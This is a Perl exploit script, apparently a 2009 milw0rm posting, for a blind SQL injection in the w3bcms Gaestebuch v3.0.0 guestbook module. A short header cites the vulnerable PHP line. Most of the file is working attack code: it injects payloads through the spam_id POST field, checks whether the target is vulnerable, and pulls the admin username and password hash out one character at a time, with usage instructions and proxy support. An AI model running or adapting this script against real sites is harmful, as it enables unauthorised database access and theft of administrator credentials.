#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use Getopt::Long;

#                           \#'#/
#                           (-.-)
#    ------------------oOO---(_)---OOo-----------------
#    |          __             __                     |
#    |    _____/ /_____ ______/ /_  __  ______ ______ |
#    |   / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/ |
#    |  (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )  |
#    | /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/   |
#    | Security Research Division      /____/ 2oo9    |
#    --------------------------------------------------
#    |  w3bcms Gaestebuch v3.0.0 Blind SQL Injection  |
#    |       (requires magic_quotes_gpc = Off)        |
#    --------------------------------------------------
# [!] Discovered.: DNX
# [!] Vendor.....: http://www.w3bcms.de
# [!] Detected...: 26.03.2009
# [!] Reported...: 29.03.2009
# [!] Response...: xx.xx.2009
#
# [!] Background.: CMS features in the frontend:
#                  Â» Ausgabe angelegter Seiten
#                  Â» Integrierter sicherer Spamschutz (kein Captcha!)
#                  Â» CMS Features wie Slogan Rotation, Datumausgabe, Seitenanzeige
#                  Â» Integrierter Besuchercounter (versteckt/sichtbar)
#               <b>Â» Sicherheit gegen Hackangriffe</b>
#                  Â» Schnelle Datenbankabfragen
#                  Â» 100% Suchmaschinenoptimiert (SEO)
#                  Â» Erweiterbar durch Module & Addons
#                  Â» UnterstÃ¼tzt Mod Rewrite URL's (optional)
#
# [!] Bug........: $_POST['spam_id'] in includes/module/book/index.inc.php near line 42
#
#                  37: } else if (isset($_GET['action']) && $_GET['action'] == "eintragen" && $modul_settings['aktiv'] == "0") {
#                  38:
#                  39:         $_POST['spamschutz'] = mysql_real_escape_string($_POST['spamschutz']);
#                  40:         $_POST['spamschutz'] = strtolower($_POST['spamschutz']);
#                  41:
#                  42:         $data = mysql_fetch_assoc(mysql_query("SELECT * FROM spamschutz WHERE id='".$_POST['spam_id']."' AND antwort='".$_POST['spamschutz']."'"));
#
# [!] Solution...: no response from vendor but the vendor has updated the module package
#

if(!$ARGV[2])
{
  print "\n                        \\#'#/                     ";
  print "\n                        (-.-)                      ";
  print "\n   ----------------oOO---(_)---OOo-----------------";
  print "\n   | w3bcms Gaestebuch v3.0.0 Blind SQL Injection |";
  print "\n   |                coded by DNX                  |";
  print "\n   ------------------------------------------------";
  print "\n[!] Usage: perl w3bcms.pl [Target] <Options>";
  print "\n[!] Example: perl w3bcms.pl -2 -u \"http://127.0.0.1/w3b/index.php?seite=2.gaestebuch\"";
  print "\n[!] Targets:";
  print "\n       -1              Get admin username";
  print "\n       -2              Get admin password hash";
  print "\n[!] Options:";
  print "\n       -u [url]        URL to vuln website";
  print "\n       -p [ip:port]    Proxy support";
  print "\n";
  exit;
}

my %options = ();
GetOptions(\%options, "1", "2", "u=s", "p=s");
my $ua      = LWP::UserAgent->new();
my $target  = $options{"u"}."&action=eintragen";

if($options{"p"})
{
  $ua->proxy('http', "http://".$options{"p"});
}

print "[!] Exploiting...\n";

check_bug($target);

if($options{"1"}) { get_username($target); }
elsif($options{"2"}) { get_password($target); }

print "\n[!] Exploit done\n";

sub check_bug
{
  my $url = shift;
  syswrite(STDOUT, "[!] Checking bug @ website: " , 28);
  my $inj = "' or 1=1/*";
  my $req = POST $url, [spam_id => $inj];
  
  my $res = $ua->request($req);
  if($res->content =~ /Bitte geben Sie Ihren Namen an/)
  {
    syswrite(STDOUT, "vuln", 4);
    print "\n";
  }
  else
  {
    syswrite(STDOUT, "not vuln", 8);
    exit;
  }
}

sub get_username
{
  my $target = shift;
  syswrite(STDOUT, "[!] Get username: ", 18);
  for(my $i = 1; $i <= 32; $i++)
  {
    my $found = 0;
    my $h = 32;
    while(!$found && $h <= 126)
    {
      if(exploit($target, $i, $h, "benutzername"))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }  
}

sub get_password
{
  my $target = shift;
  syswrite(STDOUT, "[!] Get Hash: ", 14);
  for(my $i = 1; $i <= 32; $i++)
  {
    my $found = 0;
    my $h = 48;
    while(!$found && ($h <= 57 || $h <= 102))
    {
      if(exploit($target, $i, $h, "passwort"))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      if($h == 57)
      {
        $h = 97;
      }
      else
      {
        $h++;
      }
    }
  }
}

sub exploit
{
  my $url = shift;
  my $i   = shift;
  my $h   = shift;
  my $c   = shift;
  my $inj = "' or 1=1 and substring((select ".$c." FROM admin limit 1),".$i.",1)=CHAR(".$h.")/*";
  my $req = POST $url, [spam_id => $inj];
  
  my $res = $ua->request($req);
  if($res->content =~ /Bitte geben Sie Ihren Namen an/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}

# milw0rm.com [2009-04-10]